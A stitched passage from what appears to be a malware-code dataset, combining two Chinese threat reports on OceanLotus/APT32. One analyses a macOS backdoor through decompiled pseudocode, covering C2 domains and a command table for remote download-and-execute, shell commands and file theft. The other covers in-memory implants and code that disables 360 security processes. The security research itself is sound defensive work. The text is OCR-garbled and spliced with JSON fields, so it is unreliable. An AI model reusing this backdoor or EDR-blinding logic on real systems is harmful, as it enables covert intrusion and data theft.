--->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "v5=(char*)&v153;pthread_create(&v84,&v153,(void*(*)(void*))respondownloadThread,v44);", "hash_code": "1d748aadd11b8cb0a6121c971700a36a049c3b25d7903e4a74b5752e40bf457d", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "v30(v54);", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 = \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  \n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  